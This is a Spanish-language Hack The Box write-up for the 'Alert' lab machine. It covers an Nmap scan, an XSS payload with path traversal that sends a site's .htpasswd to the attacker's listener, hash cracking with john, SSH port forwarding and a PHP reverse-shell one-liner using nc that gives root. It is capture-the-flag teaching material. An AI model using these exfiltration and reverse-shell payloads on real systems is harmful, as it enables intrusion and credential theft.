---
layout: single
title: alert - Hack The Box
excerpt: "Para resolver esta máquina es demasiado fácil. Empezamos con un escaneo con Nmap y hacemos un ataque de XSS a la página, subimos un archivo donde esta el código con el que realizamos el ataque resivimos ciertos hash."
date: 2020-10-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-alert/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - xss
  - python-serv
  - john
  - escalada de privilegio
---

![](/assets/images/htb-writeup-alert/portada.png)

Para resolver esta máquina es demasiado fácil. Empezamos con un escaneo con Nmap y hacemos un ataque de XSS a la página, subimos un archivo donde esta el código con el que realizamos el ataque resivimos ciertos hash. 

## Portscan

```
sudo nmap -p- --open -sCV 10.10.11.44
[sudo] contraseña para noes:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 00:00 CST
Nmap scan report for 10.10.11.44
Host is up (0.14s latency).
Not shown: 63807 closed tcp ports (reset), 1726 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.51 seconds
```

## http://alert.htb/


![](/assets/images/htb-writeup-alert/screenshot.png)



## subimos este codigo con la extencion md



```
───────┼──────────────────────────────────────────────────────────────────────────────────────
   1   │ <script>
   2   │ fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.ale
       │ rt.htb/.htpasswd")
   3   │   .then(response => response.text())
   4   │   .then(data => {
   5   │     fetch("http://10.10.14.64:8888/?file_content=" + encodeURIComponent(data));
   6   │   });
   7   │ </script>
```


![](/assets/images/htb-writeup-alert/screenshot2.png)

## ya que hice todo esto tendre un link con el subire a contact us



![](/assets/images/htb-writeup-alert/screenshot3.png)



```
   1   │ python3 -m http.server 8888
   2   │ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
   3   │ 10.10.14.64 - - [26/Jan/2025 01:26:12] "GET /?file_content=%0A HTTP/1.1" 200 -
   4   │ 10.10.11.44 - - [26/Jan/2025 01:26:37] "GET /?file_content=%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27
       │ messages.php%3Ffile%3D2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A HTTP/1.1"
       │  200 -
```


## ya que recibimos la coneccion revisare el file_conten
bueno en ralidad es un url encode pero me gusta darme drama
- url encode
- hash

![](/assets/images/htb-writeup-alert/screenshot4.png)


despudes de decoficarlo que era mas que claro url encode lo llavare a john para decifrarlo


```
  12   │ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt
  13   │ Using default input encoding: UTF-8
  14   │ Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
  15   │ Press 'q' or Ctrl-C to abort, almost any other key for status
  16   │ manchesterunited (albert)     
  17   │ 1g 0:00:02:03 DONE (2025-01-26 15:42) 0.008099g/s 22.64p/s 22.64c/s 22.64C/s andrea1.
       │ .charley
  18   │ Use the "--show" option to display all of the cracked passwords reliably
  19   │ Session completed
```

usuario: alberto
usuario: manchesterunited

nos conectamos por ssh

## escalada de privilegio 	DEJARE DE SUBIR IMAGENES PORQUE TARDO MAS




```
ss -tuln
```
revisamos los proceces en la maquina y vemos el puerto 8080 y es mas que claro que tendremos que hacer un simple Local port forwarding

```
ssh -L 8080:127.0.0.1:8080 albert@10.10.11.44
```
![](/assets/images/htb-writeup-alert/fotos5.png)

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/bash -i 2>&1 | nc 10.10.16.41 7878 >/tmp/f");?>
```
y si ejcutamos ese comando recibimos una conexion con root

## la maquina esta muy biene explicada aun que deje de subi imagenes casi a mitad de la maquina ya que me quita mas tiempo es mas facil copiar y pegar y como hago la maquina y la subi a mi pagina se me hace mas dificil tomar captura y cuidar que no suba algo que no quiero de mi maquina  y cabe recalcar que estoy en un torneo de hackthebox cualquier duda de la maquina con gunto les doy una explicaion mis redes estan en el inicio de mi pagina
